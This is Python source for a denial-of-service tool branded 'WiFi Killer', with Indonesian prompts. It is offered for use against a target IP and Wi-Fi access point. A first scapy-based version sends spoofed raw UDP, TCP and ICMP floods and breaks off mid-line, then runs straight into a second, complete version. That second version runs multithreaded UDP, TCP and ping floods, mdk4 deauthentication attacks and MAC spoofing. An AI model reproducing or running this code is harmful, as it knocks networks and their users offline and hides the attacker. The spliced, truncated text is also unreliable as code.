#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import struct
import threading
import subprocess
from scapy.all import *
from colorama import Fore, init
import psutil
import requests

init(autoreset=True)

# ===== BANNER =====
print(Fore.RED + """
╔══════════════════════════════════════════════════╗
║     WiFi Killer FINAL v5.0 - "The Annihilator"   ║
║     Made by @Barxzzz                             ║
║     "100% Work - No Mercy"                       ║
╚══════════════════════════════════════════════════╝
""")

# ===== INPUT =====
target_ip = input(Fore.CYAN + "[?] Target IP: " + Fore.WHITE)
target_port = int(input(Fore.CYAN + "[?] Target Port (0=random): " + Fore.WHITE) or 0)
threads = int(input(Fore.CYAN + "[?] Threads (rekomendasi: 1000-2000): " + Fore.WHITE))
duration = int(input(Fore.CYAN + "[?] Durasi (detik): " + Fore.WHITE))
bssid = input(Fore.CYAN + "[?] BSSID (opsional, enter skip): " + Fore.WHITE)
channel = input(Fore.CYAN + "[?] Channel (opsional): " + Fore.WHITE) or "6"

# ===== KERNEL RAW SOCKET =====
def create_raw_socket():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        return sock
    except PermissionError:
        print(Fore.RED + "[!] Jalankan sebagai root!")
        sys.exit(1)

# ===== SPOOF FUNCTIONS =====
def random_mac():
    return ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

# ===== PAYLOAD GENERATOR =====
def generate_payload(size=8192):
    return os.urandom(size)

# ===== UDP FLOOD (RAW) =====
def udp_raw_flood(ip, port, dur):
    sock = create_raw_socket()
    end = time.time() + dur
    while time.time() < end:
        for _ in range(50):
            try:
                src_ip = random_ip()
                packet = IP(src=src_ip, dst=ip)/UDP(sport=random.randint(1,65535), dport=port if port!=0 else random.randint(1,65535))/Raw(load=generate_payload(8192))
                sock.sendto(bytes(packet), (ip, 0))
            except:
                pass

# ===== TCP FLOOD (SYN + ACK + RST) =====
def tcp_flood(ip, port, dur):
    sock = create_raw_socket()
    end = time.time() + dur
    while time.time() < end:
        for _ in range(30):
            try:
                src_ip = random_ip()
                packet = IP(src=src_ip, dst=ip)/TCP(sport=random.randint(1,65535), dport=port if port!=0 else random.randint(1,65535), flags="S", seq=random.randint(0, 4294967295))
                sock.sendto(bytes(packet), (ip, 0))
                packet = IP(src=src_ip, dst=ip)/TCP(sport=random.randint(1,65535), dport=port if port!=0 else random.randint(1,65535), flags="A", seq=random.randint(0, 4294967295))
                sock.sendto(bytes(packet), (ip, 0))
            except:
                pass

# ===== ICMP FLOOD (Fragmented) =====
def icmp_flood(ip, dur):
    sock = create_raw_socket()
    end = time.time() + dur
    while time.time() < end:
        for _ in range(20):
            try:
                src_ip = random_ip()
                packet = IP(src=src_ip, dst=ip, flags=1, frag=0)/ICMP(type=8, code=0)/Raw(load=generate_payload(65500))
                sock.sendto(bytes(packet), (ip, 0))
            except:
                pass

# ===== HTTP/HTTPS FLOOD (Layer 7) =====
def http_flood(ip, dur):
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_war#!/usr/bin/env python3
import os
import sys
import time
import random
import socket
import threading
import subprocess
from colorama import Fore, init
import psutil

init(autoreset=True)

# ===== BANNER =====
print(Fore.RED + """
╔══════════════════════════════════════════════╗
║     WiFi Killer TERMUX EDITION v6.0          ║
║     Made by BARZZ_BOT                        ║
║     "100% Work - No Scapy Needed"            ║
╚══════════════════════════════════════════════╝
""")

# ===== INPUT =====
target_ip = input(Fore.CYAN + "[?] Target IP: " + Fore.WHITE)
target_port = int(input(Fore.CYAN + "[?] Target Port (0=random): " + Fore.WHITE) or 0)
threads = int(input(Fore.CYAN + "[?] Threads (100-500): " + Fore.WHITE))
duration = int(input(Fore.CYAN + "[?] Durasi (detik): " + Fore.WHITE))
bssid = input(Fore.CYAN + "[?] BSSID (opsional): " + Fore.WHITE)

# ===== RANDOM IP =====
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

# ===== PAYLOAD =====
def payload(size=4096):
    return os.urandom(size)

# ===== UDP FLOOD =====
def udp_flood(ip, port, dur):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        end = time.time() + dur
        while time.time() < end:
            for _ in range(50):
                try:
                    sock.sendto(payload(8192), (ip, port if port != 0 else random.randint(1, 65535)))
                except:
                    pass
    except:
        pass

# ===== TCP FLOOD =====
def tcp_flood(ip, port, dur):
    end = time.time() + dur
    while time.time() < end:
        try:
            for _ in range(20):
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.01)
                sock.connect((ip, port if port != 0 else random.randint(1, 65535)))
                sock.send(payload(2048))
                sock.close()
        except:
            pass

# ===== ICMP FLOOD (ping) =====
def icmp_flood(ip, dur):
    end = time.time() + dur
    while time.time() < end:
        try:
            os.system(f"ping -s 65500 -c 1 -W 0.1 {ip} > /dev/null 2>&1")
        except:
            pass

# ===== DEAUTH ATTACK (pakai mdk4) =====
def deauth_attack(bssid, dur):
    if bssid:
        end = time.time() + dur
        while time.time() < end:
            try:
                os.system(f"mdk4 wlan0mon d -b {bssid} -c 6 -v 0 > /dev/null 2>&1 &")
                time.sleep(0.5)
            except:
                pass

# ===== MAC SPOOFER =====
def mac_spoofer():
    try:
        new_mac = ':'.join(['{:02x}'.format(random.randint(0, 255)) for _ in range(6)])
        os.system(f"ifconfig wlan0mon down 2>/dev/null")
        os.system(f"macchanger -m {new_mac} wlan0mon 2>/dev/null")
        os.system(f"ifconfig wlan0mon up 2>/dev/null")
    except:
        pass

# ===== MONITOR BANDWIDTH =====
def monitor_bandwidth(dur):
    print(Fore.YELLOW + "\n[📊] Bandwidth Monitor:")
    start = time.time()
    while time.time() - start < dur:
        try:
            net = psutil.net_io_counters()
            mbps = (net.bytes_sent / 1024 / 1024) / (time.time() - start + 0.001)
            print(Fore.GREEN + f"[📈] Speed: {mbps:.2f} MB/s", end="\r")
            time.sleep(0.3)
        except:
            pass

# ===== MAIN =====
def start_attack():
    print(Fore.GREEN + f"\n[⚡] Attacking {target_ip}:{target_port} with {threads} threads...")
    print(Fore.RED + "[⚠️] Target will die in seconds!\n")
    
    # Monitor
    threading.Thread(target=monitor_bandwidth, args=(duration,), daemon=True).start()
    
    # MAC spoof tiap 5 detik
    threading.Thread(target=lambda: [mac_spoofer() for _ in range(duration//5)], daemon=True).start()
    
    # Flood threads
    for i in range(threads):
        threading.Thread(target=udp_flood, args=(target_ip, target_port, duration), daemon=True).start()
        threading.Thread(target=tcp_flood, args=(target_ip, target_port, duration), daemon=True).start()
        threading.Thread(target=icmp_flood, args=(target_ip, duration), daemon=True).start()
    
    # Deauth
    if bssid:
        threading.Thread(target=deauth_attack, args=(bssid, duration), daemon=True).start()
    
    time.sleep(duration)
    print(Fore.RED + "\n[✔] DONE! Target is down.\n")

# ===== RUN =====
if __name__ == "__main__":
    try:
        start_attack()
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Stopped by user.")
